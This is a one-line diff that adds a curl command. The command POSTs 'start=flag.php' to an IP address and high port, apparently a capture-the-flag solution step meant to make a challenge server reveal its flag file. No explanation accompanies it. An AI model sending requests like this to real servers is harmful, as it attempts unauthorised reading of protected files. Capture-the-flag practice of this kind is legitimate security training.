@@ -1,0 +1,1 @@
+curl http://35.198.183.125:31373?start=0 -X POST --data start=flag.php
